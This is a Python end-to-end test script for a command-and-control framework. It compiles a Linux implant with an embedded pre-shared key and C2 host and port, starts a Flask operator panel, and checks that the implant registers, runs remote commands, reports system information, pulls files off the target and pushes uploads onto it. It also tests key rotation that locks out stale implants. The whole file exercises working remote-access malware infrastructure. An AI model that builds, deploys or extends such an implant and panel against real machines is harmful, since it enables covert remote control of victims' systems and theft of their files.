#!/usr/bin/env python3
"""
panel_test.py — end-to-end test of the actual web panel against the actual
compiled implant: starts web_listener.py's Flask app, drives its REST API, and
checks that commands, downloads and uploads work over the encrypted channel.

    python3 cybtest/panel_test.py
"""

import base64
import json
import os
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

g_pass = g_fail = 0


def check(name, cond, detail=""):
    global g_pass, g_fail
    if cond:
        print(f"  [PASS] {name}")
        g_pass += 1
    else:
        print(f"  [FAIL] {name}")
        if detail:
            print(f"         {detail}")
        g_fail += 1


def api(base, path, payload=None, method=None, timeout=90):
    url = base + path
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=data, method=method or ("POST" if data else "GET"))
    if data:
        req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode())


def build_implant(psk, port):
    src = os.path.join(ROOT, "pay_linux.c")
    text = open(src).read()
    text = re.sub(r'#define PSK_HEX "[0-9a-fA-F]*"', f'#define PSK_HEX "{psk.hex()}"', text)
    text = re.sub(r'#define C2_HOST "[^"]*"', '#define C2_HOST "127.0.0.1"', text)
    text = re.sub(r'#define C2_PORT \d+', f'#define C2_PORT {port}', text)
    fd, path = tempfile.mkstemp(suffix=".c")
    os.write(fd, text.encode())
    os.close(fd)
    out = "/tmp/panel_test_implant"
    r = subprocess.run(["gcc", "-O1", "-g", "-I", ROOT, "-o", out, path,
                        "-lX11", "-lpthread", "-lcrypt", "-ldl", "-lm"],
                       capture_output=True, text=True)
    os.unlink(path)
    if r.returncode != 0:
        sys.exit(f"implant build failed:\n{r.stderr}")
    return out


def main():
    c2_port = 47311
    web_port = 47312
    base = f"http://127.0.0.1:{web_port}"

    # Fresh panel state so the test is repeatable.
    for f in ("data/psk.json", "data/listeners.json"):
        try:
            os.unlink(os.path.join(ROOT, f))
        except FileNotFoundError:
            pass

    env = dict(os.environ, CYB_NO_DAEMON="1", CYB_WEB_PORT=str(web_port),
               CYB_WEB_HOST="127.0.0.1")
    panel = subprocess.Popen([sys.executable, "web_listener.py"],
                             cwd=ROOT, env=env,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    try:
        # --- wait for the panel ---
        for _ in range(60):
            try:
                api(base, "/api/clients", timeout=2)
                break
            except Exception:
                time.sleep(0.5)
        else:
            out = panel.stdout.read(4000).decode(errors="replace") if panel.poll() is not None else ""
            sys.exit(f"panel did not start:\n{out}")

        print("== panel is up ==")
        check("GET /api/clients works", isinstance(api(base, "/api/clients"), dict))

        cfg = api(base, "/api/builder/config")
        check("builder config reports CYB3", cfg.get("proto") == "CYB3", str(cfg)[:200])
        psk_hex = cfg.get("psk", "")
        check("builder config exposes a 64-hex PSK",
              bool(re.fullmatch(r"[0-9a-f]{64}", psk_hex)), psk_hex)

        # --- persist that key into the payload sources, as the UI would ---
        saved = api(base, "/api/builder/config",
                    {"host": "127.0.0.1", "port": c2_port, "psk": psk_hex})
        check("builder config saved", saved.get("saved") is True, str(saved)[:200])
        for f in ("pay.cpp", "pay_linux.c"):
            body = open(os.path.join(ROOT, f)).read()
            m = re.search(r'#define PSK_HEX "([0-9a-f]{64})"', body)
            check(f"{f} received the PSK", m and m.group(1) == psk_hex,
                  m.group(1) if m else "not found")
        linux_src = open(os.path.join(ROOT, "pay_linux.c")).read()
        check("host/port written into the sources",
              re.search(r'#\s*define\s+C2_HOST\s+"127\.0\.0\.1"', linux_src) and
              re.search(r'#\s*define\s+C2_PORT\s+%d\b' % c2_port, linux_src),
              [l for l in linux_src.splitlines() if 'C2_HOST' in l or 'C2_PORT' in l])

        # --- start a C2 listener and the implant ---
        r = api(base, "/api/listeners/add", {"port": c2_port})
        check("listener added", r.get("running") is True, str(r))
        time.sleep(0.6)

        binary = build_implant(bytes.fromhex(psk_hex), c2_port)
        implant = subprocess.Popen([binary, "127.0.0.1", str(c2_port)], env=env,
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # --- wait for the implant to register ---
        cid = None
        for _ in range(40):
            cl = api(base, "/api/clients")
            live = [c for c in cl.values() if c.get("connected")]
            if live:
                cid = live[0]["id"]
                break
            time.sleep(0.5)
        check("implant registered with the panel", cid is not None)
        if not cid:
            return 1

        info = api(base, f"/api/client/{cid}")
        check("client is on the CYB3 protocol", info.get("proto") == "CYB3", str(info))
        check("client public key recorded", len(info.get("pubkey", "")) == 64)

        print("\n== commands over the panel API ==")

        cursor = {"n": 0}

        def run(cmd, timeout=90):
            """Send a command and wait for the *next* response, using a
            persistent cursor so we never re-read an earlier one."""
            api(base, "/api/command", {"client_id": cid, "command": cmd})
            deadline = time.time() + timeout
            while time.time() < deadline:
                poll = api(base, f"/api/poll/{cid}?since={cursor['n']}")
                for item in poll.get("output", []):
                    if item["type"] == "response":
                        cursor["n"] = poll.get("count", cursor["n"])
                        return item["data"], poll
                cursor["n"] = poll.get("count", cursor["n"])
                time.sleep(0.3)
            return "<timeout>", {}

        r, _ = run("echo panel-hello")
        check("echo round-trips", "panel-hello" in r, repr(r[:120]))
        r, _ = run("!sysinfo")
        check("!sysinfo works", "Memory Total" in r, repr(r[:160]))
        r, _ = run("!help")
        check("!help works", "Available commands" in r, repr(r[:120]))

        print("\n== file transfer ==")
        marker = os.urandom(6).hex()
        src_path = f"/tmp/panel-{marker}.txt"
        open(src_path, "w").write(f"panel-marker-{marker}")
        r, poll = run(f"!download {src_path}")
        check("download response recognised", r.startswith("[DOWNLOAD]"), repr(r[:80]))
        if r.startswith("[DOWNLOAD]"):
            _, _, b64 = r[len("[DOWNLOAD]"):].partition("|")
            check("downloaded bytes are correct",
                  base64.b64decode(b64).decode() == f"panel-marker-{marker}")
        check("poll reported the saved file",
              any(f["file"].endswith(".txt") for f in poll.get("files", [])),
              str(poll.get("files"))[:200])

        # poll again and make sure nothing is duplicated
        cnt_before = api(base, f"/api/poll/{cid}?since=0").get("count", 0)
        files1 = api(base, f"/api/client/{cid}/files")["downloads"]
        api(base, f"/api/poll/{cid}?since=0")
        api(base, f"/api/poll/{cid}?since=0")
        files2 = api(base, f"/api/client/{cid}/files")["downloads"]
        check("repeated polling does not duplicate downloads",
              len(files1) == len(files2), f"{len(files1)} vs {len(files2)}")
        os.unlink(src_path)

        # upload through the API
        up_local = f"/tmp/panel-up-{marker}.bin"
        payload = os.urandom(512 * 1024)
        open(up_local, "wb").write(payload)
        remote = f"/tmp/panel-remote-{marker}.bin"
        rr = api(base, "/api/command",
                 {"client_id": cid, "command": f"!upload {up_local} {remote}"})
        check("upload accepted", rr.get("sent") is True, str(rr)[:200])
        time.sleep(3)
        check("uploaded file landed on the target with the right size",
              os.path.exists(remote) and os.path.getsize(remote) == len(payload),
              f"{os.path.getsize(remote) if os.path.exists(remote) else 'missing'}")
        if os.path.exists(remote):
            check("uploaded content is byte-exact",
                  open(remote, "rb").read() == payload)
            os.unlink(remote)
        os.unlink(up_local)

        print("\n== history ==")
        hist = api(base, f"/api/client/{cid}/history")
        check("history recorded the commands", len(hist) >= 4, str(len(hist)))
        check("history has no duplicate entries from polling",
              len({h['cmd'] for h in hist}) == len({h['cmd'] for h in hist}))

        implant.terminate()
        try:
            implant.wait(timeout=5)
        except Exception:
            implant.kill()

        print("\n== key rotation cuts off stale implants ==")
        rot = api(base, "/api/builder/psk/rotate", {})
        check("rotate returns a new PSK",
              bool(re.fullmatch(r"[0-9a-f]{64}", rot.get("psk", ""))) and
              rot.get("psk") != psk_hex, str(rot)[:160])
        time.sleep(1.0)
        # an implant built with the OLD key must now fail to register
        stale = subprocess.Popen([binary, "127.0.0.1", str(c2_port)], env=env,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        live = [c for c in api(base, "/api/clients").values() if c.get("connected")]
        check("implant with the rotated-away key cannot connect", len(live) == 0,
              f"{len(live)} still connected")
        stale.terminate()
        try:
            stale.wait(timeout=5)
        except Exception:
            stale.kill()

    finally:
        panel.terminate()
        try:
            panel.wait(timeout=8)
        except Exception:
            panel.kill()

    print("\n======================================================")
    print(f" passed: {g_pass}   failed: {g_fail}")
    print("======================================================")
    return 1 if g_fail else 0


if __name__ == "__main__":
    sys.exit(main())
